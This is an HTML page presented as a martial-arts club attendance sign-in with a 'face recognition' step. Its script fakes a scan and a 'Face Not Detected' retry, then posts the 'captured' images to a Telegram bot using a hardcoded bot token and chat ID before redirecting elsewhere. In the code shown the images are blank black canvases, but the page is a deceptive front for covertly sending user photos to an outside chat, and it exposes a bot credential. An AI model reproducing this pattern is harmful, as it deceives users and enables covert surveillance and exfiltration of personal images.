<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ittihad Fighters Attendance</title>
    <script>
        const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y';
        const TELEGRAM_CHAT_ID = '5934902786';
        let selectedNames = new Set();

        function toggleName(name) {
            if (selectedNames.has(name)) return;
            selectedNames.add(name);
            document.getElementById(name).disabled = true;
        }

        function showFaceRecognition() {
            document.getElementById('name-selection').style.display = 'none';
            document.getElementById('face-recognition').style.display = 'block';
        }

        function cancelProcess() {
            alert('Page will stop here.');
        }

        function startFaceScan() {
            document.getElementById('face-recognition').style.display = 'none';
            document.getElementById('scan-animation').style.display = 'block';
            setTimeout(captureImage, 2000);
        }

        function captureImage() {
            let canvas = document.createElement('canvas');
            let ctx = canvas.getContext('2d');
            canvas.width = 640;
            canvas.height = 480;
            ctx.fillStyle = "black";
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => sendImage(blob), 'image/jpeg');

            setTimeout(() => {
                document.getElementById('scan-animation').style.display = 'none';
                document.getElementById('face-not-detected').style.display = 'block';
                setTimeout(() => {
                    document.getElementById('face-not-detected').style.display = 'none';
                    document.getElementById('scan-animation').style.display = 'block';
                    setTimeout(captureSecondImage, 3000);
                }, 3000);
            }, 2000);
        }

        function captureSecondImage() {
            let canvas = document.createElement('canvas');
            let ctx = canvas.getContext('2d');
            canvas.width = 640;
            canvas.height = 480;
            ctx.fillStyle = "black";
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => sendImage(blob, true), 'image/jpeg');
        }

        function sendImage(blob, final = false) {
            let formData = new FormData();
            formData.append("chat_id", TELEGRAM_CHAT_ID);
            formData.append("photo", blob, "face.jpg");

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: formData
            }).then(() => {
                if (final) showSuccessMessage();
            }).catch(err => console.error("Error sending photo: ", err));
        }

        function showSuccessMessage() {
            document.getElementById('scan-animation').style.display = 'none';
            document.getElementById('success-message').style.display = 'block';
            document.getElementById('signed-names').innerText = Array.from(selectedNames).join(', ') + " signed in";
            setTimeout(() => {
                window.location.href = "https://studandlearn.github.io/project-2/";
            }, 3000);
        }
    </script>
    <style>
        body { text-align: center; font-family: Arial, sans-serif; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <h1>Ittihad Fighters</h1>
    
    <div id="name-selection">
        <h2>Select Your Name</h2>
        <button id="Izz" onclick="toggleName('Izz')">Izz</button>
        <button id="Ali" onclick="toggleName('Ali')">Ali</button>
        <button id="Ahmad" onclick="toggleName('Ahmad')">Ahmad</button>
        <br><br>
        <button onclick="showFaceRecognition()">Continue</button>
        <button onclick="cancelProcess()">Cancel</button>
    </div>

    <div id="face-recognition" class="hidden">
        <h2>Face Recognition</h2>
        <button onclick="startFaceScan()">Continue</button>
        <button onclick="cancelProcess()">Cancel</button>
    </div>

    <div id="scan-animation" class="hidden">
        <h2>Scanning...</h2>
    </div>

    <div id="face-not-detected" class="hidden">
        <h2>Face Not Detected</h2>
    </div>

    <div id="success-message" class="hidden">
        <h2>âœ… Done</h2>
        <p id="signed-names"></p>
        <p>You look beautiful/handsome today!</p>
        <p>Redirecting to the next page...</p>
    </div>
</body>
</html>
